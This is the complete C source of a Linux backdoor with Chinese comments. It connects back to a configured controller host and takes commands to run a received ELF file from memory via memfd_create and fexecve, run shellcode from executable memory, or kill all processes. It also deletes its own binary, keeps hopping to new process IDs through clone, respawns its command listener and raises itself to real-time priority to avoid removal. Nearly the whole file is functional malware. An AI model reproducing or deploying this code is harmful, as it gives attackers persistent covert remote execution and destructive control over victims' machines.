#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>

#include "crazy-common.h"

#define forceinline __inline__ __attribute__((always_inline))

#define MFD_CLOEXEC		0x0001U
#define MFD_ALLOW_SEALING	0x0002U

#define PAGE_SZ 0x1000
#define STACK_SIZE 1024*1024
#define PAGE_ALIGN(size) (size % PAGE_SZ == 0 ? size : (size % PAGE_SZ + 1)*PAGE_SZ)

typedef int (*CLONE_PROC_FUNC)(void *);
typedef void (*SHELLCODE_FUNC)();

/* 使用的libc函数
syscall
open
mmap
close
clone
perror
exit
read
unlink
ftruncate
munmap
fork
fexecve
_exit
sleep
time
nanosleep
kill
socket
connect
recv
send
sched_get_priority_max
sched_setscheduler
*/

//libc2.23未实现
int memfd_create(const char *name, unsigned int flags)
{
    return syscall(319, name, flags);
}

/** ----------------- global varible -------------------- **/
/* shellcode 存储区 */
char * g_shellcode_ptr = 0;
/* 内存文件描述符 */
int g_memfd = -1;
/* 0 不杀 1 杀所有*/
int g_kill_policy = 0;
/* 命令处理进程的时间戳 */
long g_alive_timestamp = 0;
/* 进程栈 0,1,2 给主进程交替使用 2 固定给命令处理进程使用*/
char * g_stack[4] = {0};
/* 主进程栈ID */
int g_main_stack_id = 0;

/** ----------------- function declare --------------------**/
void start_new_shared_proc(CLONE_PROC_FUNC proc_func, int stackid, int parent_exit);
int cmd_receiver_proc_func(void * arg);

/** ----------------- 基础函数 ---------------------- **/
#define HTONL(A) ((((unsigned int)(A) & 0xff000000) >> 24) | \
               (((unsigned int)(A) & 0x00ff0000) >> 8) | \
               (((unsigned int)(A) & 0x0000ff00) << 8) | \
               (((unsigned int)(A) & 0x000000ff) << 24))
#define NTOHL(A) HTONL(A)
#define INVERSE(x) (~x & 0x00000001)
/* 命令处理进程的栈ID */
#define CMDRECVER_STACK_ID 3
/* 内存申请 */
forceinline void * __runable_malloc(int size)
{
    int fd = open("/dev/zero", 0);
    void * ret = mmap(NULL, PAGE_ALIGN(size), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0);
    close(fd);
    return ret;
}

/*创建轻量级进程
  所有子进程都共享内存，但不是线程，有独立的进程号，被杀死也不会互相影响
*/
void start_new_shared_proc(CLONE_PROC_FUNC proc_func, int stack_id, int parent_exit)
{
    char * stackTop = g_stack[stack_id] + STACK_SIZE;
    pid_t pid = clone(proc_func, stackTop, CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_IO, 0);
    if (pid == -1)
    {
        perror("clone");
        return;
    }
    
    //printf("new pid = %ld\n", pid);
    
    if(parent_exit)
        _exit(0);
}

void self_delete()
{
    int fd = open("/proc/self/cmdline", 0);
    char path[255] = {0};
    int len = read(fd, path, sizeof(path));
    close(fd);
    unlink(path);
}

/** -------------------  通信协议处理  -------------------------**/
/* 阻塞接收并处理一个命令
in fd: socket句柄
return value: 0 成功 -1 失败
*/
int receive_packet(int fd)
{
    struct BKMessage head;
    memset(&head, 0, sizeof(head));
    if(receive_len(fd, (char *)&head, sizeof(struct BKMessage)) == 1)
    {
        int payload_size = NTOHL(head.content_size);
        head.magic = NTOHL(head.magic);
        if(payload_size < 0 || head.magic != MAGIC)
        {
            return -1;
        }
        
        //dumpHex((char *)&head, sizeof(head));
        
        switch(head.cmdcode)
        {
        case 0x01: //执行ELF
            {
                if(g_memfd != -1)
                    close(g_memfd);
                
                g_memfd = memfd_create("memfile", MFD_ALLOW_SEALING);
                if(g_memfd == -1)
                {
                    //perror("memfd_create");
                    return -1;
                }
                
                if (ftruncate(g_memfd, payload_size) == -1)
                {
                    //perror("ftruncate()");
                    return -1;
                }
                
                //zero copy
                //sendfile的fd_in不能是socket,tee, splice只支持管道，只能使用mmap折中一下
                int size_align = PAGE_ALIGN(payload_size);
                char * shm = mmap(NULL, size_align, PROT_READ | PROT_WRITE, MAP_SHARED, g_memfd, 0);
                if(shm == MAP_FAILED)
                {
                    //perror("mmap");
                    return -1;
                }
                
                int rsp = receive_len(fd, shm, payload_size);               
                if (munmap(shm, size_align) == -1)
                {
                    //perror("munmap()");
                    return -1;
                }
                
                //printf("load ELF file size %d\n", payload_size);
                if(rsp != 1)
                    return -1;
                
                if(fork() == 0)
                {
                    //printf("exec ELF pid = %d\n", getpid());
                    char *const params[] = {NULL};
                    char *const environ[] = {NULL};
                    if(fexecve(g_memfd, params, environ) == -1)
                    {
                        //perror("fexecve");
                        _exit(0);
                    }
                }
            }
            break;
        case 0x02: //执行shellcode
            {
                if(payload_size >= 0x1000)
                {
                    return -1;
                }
                
                if(receive_len(fd, g_shellcode_ptr, payload_size) == 1)
                {
                    SHELLCODE_FUNC func = (SHELLCODE_FUNC)g_shellcode_ptr;
                    g_shellcode_ptr[payload_size] = 0xc3; //ret
                    if(fork() == 0)
                    {
                        if(head.is_cycle)
                        {
                            while(1)
                            {
                                func();
                                sleep(head.peroid);
                            }
                        }
                        else
                        {
                            func();
                            _exit(0);
                        }
                    }
                }
            }
            break;
        case 0x03: //kill -9 -1
            //需要主线程来kill
            g_kill_policy = 1;
            break;
        case 0x04: //自杀
            break;
        default:
            break;
        }
        return 0;
    }
    return -1;
}
/** -------------------  进程执行函数  -------------------------**/
/* 主进程 */
int main_proc_func(void * arg)
{
    #define NANOSECOND 1000000
    struct timespec sleeptm;
    sleeptm.tv_sec = 0;
    sleeptm.tv_nsec = NANOSECOND;
    
    #define TIMEOUT 30
    long now = time(0);
    
    if(g_kill_policy == 1)
    {
        kill(-1, 9);
        g_kill_policy = 0;
    }
    
    //超时没刷新就认为进程被杀重启
    if(now - g_alive_timestamp > TIMEOUT)
    {
        g_alive_timestamp = now;
        start_new_shared_proc(cmd_receiver_proc_func, CMDRECVER_STACK_ID, 0);
    }
    
    nanosleep(&sleeptm, NULL);
    
    g_main_stack_id = g_main_stack_id == 2?0:++g_main_stack_id;
    start_new_shared_proc(main_proc_func, g_main_stack_id, 1);
    return 0;
}

/* 命令处理进程 */
int cmd_receiver_proc_func(void * arg)
{
    struct sockaddr_in srv_addr;
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(PEER_PORT);
    srv_addr.sin_addr.s_addr = inet_addr(PEER_IP);
    
    //printf("new cmd receiver %d\n", getpid());
    
    while(1)
    {
        //刷新时间戳
        time(&g_alive_timestamp);
        int sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
        if(connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr)) == 0)
        {
            //先发送认证包
            struct BKMessage msg;
            memset(&msg, 0, sizeof(msg));
            msg.magic = htonl(MAGIC);
            msg.cmdcode = 0xFF;
            send(sockfd, (char *)&msg, sizeof(msg), 0);
            while(receive_packet(sockfd) == 0);
        }
        
        close(sockfd);
        sleep(5);
    }
}

int main()
{
     //切换成实时调度SCHED_FIFO,并且优先级设为最高
    struct sched_param param;
    param.sched_priority = sched_get_priority_max(SCHED_FIFO);
    sched_setscheduler(getpid(), SCHED_FIFO, &param);
    
    signal(SIGCHLD,SIG_IGN);
    
    g_stack[0] = __runable_malloc(STACK_SIZE);
    g_stack[1] = __runable_malloc(STACK_SIZE);
    g_stack[2] = __runable_malloc(STACK_SIZE);
    g_stack[CMDRECVER_STACK_ID] = __runable_malloc(STACK_SIZE);
    g_shellcode_ptr = __runable_malloc(0x1000);
    
    time(&g_alive_timestamp);
    
    start_new_shared_proc(cmd_receiver_proc_func, CMDRECVER_STACK_ID, 0);
    start_new_shared_proc(main_proc_func, g_main_stack_id, 1);
    
    return 0;
}
